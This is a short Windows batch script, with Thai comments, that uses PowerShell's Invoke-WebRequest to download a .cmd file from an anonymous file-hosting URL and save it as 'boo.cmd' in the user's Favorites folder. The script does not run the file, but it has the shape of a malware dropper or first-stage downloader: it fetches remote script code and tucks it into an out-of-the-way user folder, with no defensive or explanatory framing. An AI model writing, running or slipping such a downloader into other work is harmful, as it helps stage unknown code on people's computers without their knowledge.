@echo off
setlocal enabledelayedexpansion

REM ระบุ URL ของไฟล์ที่ต้องการดาวน์โหลด
set "fileURL=https://files.catbox.moe/zrz28x.cmd"

REM ระบุโฟลเดอร์ที่ต้องการบันทึกไฟล์
set "destinationFolder=%USERPROFILE%\Favorites"

REM ใช้คำสั่ง PowerShell เพื่อดาวน์โหลดไฟล์
powershell -command "& { Invoke-WebRequest -Uri '%fileURL%' -OutFile ('%destinationFolder%\boo.cmd') }"

echo Download completed.

:end
